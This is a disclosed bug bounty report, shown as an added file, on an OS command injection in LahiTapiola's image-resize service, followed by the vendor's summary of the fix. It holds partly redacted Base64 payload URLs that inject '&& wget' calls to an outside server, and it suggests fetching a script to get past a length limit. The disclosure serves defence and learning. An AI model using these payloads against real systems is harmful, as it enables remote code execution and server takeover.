@@ -1,0 +1,76 @@
+ReportLink:https://hackerone.com/reports/303061
+WeaknessName:OS Command Injection
+Reporter:https://hackerone.com/yonm13
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:6800.0
+Severity:high
+State:Closed
+DateOfDisclosure:27.02.2018 11:29:45
+
+Summary:
+##Issue
+
+The reporter found an intricate way of performing an RCE against the server.  The issue arose from a design where the service is using a command line tool to dynamically resize images on the fly. The reporter managed to find a weakness in the way the process was implemented. An attack against this flaw would have lead to a total compromise of the server. 
+
+##Fix
+Using and calling command line tools - as pointed out by the reporter many times - is considered very bad practice. Controlling and sanitizing input to a level that is truly secure is almost impossible. On the other hand, fixing an issue like this is not straightforward due to the fact that the implementation not just contains a technical flaw it also more or less contains an architectural and principal flaw. The reporter assisted in testing the fix which in the end lead to an acceptable although not perfect result.
+
+
+##Reasoning
+
+The reported case was valid and within the scope of the bug bounty program. Although this service is a part of the LahiTapiola bug bounty program, it is actually a shared platform operated by a third party. LahiTapiola is just one of many corporate users. Fixing the issue was in part coordinated by LahiTapiola to ensure that the width and the breadth of the issue was understood by all affected and involved parties, and that no details were leaked ahead of time as not to put anyone at risk. 
+
+The service does not contain any LahiTapiola customer information nor is it part of the core systems at LahiTapiola. Even if fully owned, the server would not pose a direct threat to other LahiTapiola services - any pivoting to the core internal networks would not have been possible. From a bounty point of view, LahiTapiola always assesses reports from a business perspective.
+
+The issue is fixed, although not perfectly in any way. Further reports on this matter must provide more actual proof than just repeating the conclusions of this report to be eligible for processing. For any developer reading this report, this can be considered a true learning opportunity.
+
+LahiTapiola wishes to thank the reporter for a valid and valuable report and for patience and assistance during the process of fixing.
+**Summary:** 
+the "/system/images" URL accepts a Base-64 encoded string, which is in turn used to convert images from the local disk before displaying them to the user. The website fails to validate the user input, allowing arbitrary bash command injection.
+
+**Description:** 
+When surfing the toimitilat.lahitapiola.fi domain, an attacker may encounter URLs like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg```
+
+The latter part is unnecessary, and the Base64 encoded string resolves to (with some non displayable characters).
+```[[:fI"H2017/12/01/08_34_36_493_00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg:ET[	:p:convertI")-strip -interlace Plane -quality 80%;T0[;:
+thumbI"	102x;```.
+
+The 36 characters from after ' convertI") ' until after the '80%' can be manipulated as the attacker wishes (padded by spaces to be exactly 36 characters), used to change the parameters injected to "convert" (by imagemagick, a library with multiple known vulnerabilities), and even inject arbitrary bash commands. e.g.
+```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl████████aXNpdnVfbHQuanBnB████████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y█████████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA ```
+
+(Injected command ``` && wget http://████████/d.html```).
+This results in a 500 Error, as the server cannot return the image, but the action is performed as can be seen by attached PoC picture.
+
+The 36 character limit poses limits on the attacker being able to exfiltrate data, which can probably be bypassed by creating a short runnable script in the running directory, (or downloading it from the internet using wget), then running it. I had started working towards a larger PoC (such as the /etc/passwd contents or equal), but have run out of time for today, hence reporting this with the "wget" PoC as this is quite a critical vulnerability, and it shouldn't wait until tomorrow. (This is an acceptable PoC for Remote Code Execution, as seen on HackerOne)
+
+Please, feel free to ask additional questions, or consult about possible solutions.
+
+**Domain:** 
+toimitilat.lahitapiola.fi
+
+## Browsers / Apps Verified In:
+N/A
+
+## Steps To Reproduce:
+
+(Add details for how we can reproduce the issue)
+
+  1. Issue a request like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl███aXNpdnVfbHQuanBnB███████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y██████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA```
+replacing my server's IP with an internet facing server under your control.
+  2. See the issued request.
+
+## Additional material
+
+  * Screenshots: 
+1."Empty WGET". - A simple, empty WGET request to my server.
+2."d.html" WGET - A WGET request to my server, downloading a file named d.html successfuly
+3. Working folder disclosure through "comment" flag injection
+
+## Related reports, best practices
+https://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html
+https://www.owasp.org/index.php/OS_Command_Injection_Defense_Cheat_Sheet
+https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet
+
+## Impact
+
+This can lead to the attacker controlling the Tapiola server, altering its contents, using it as part of a botnet etc.
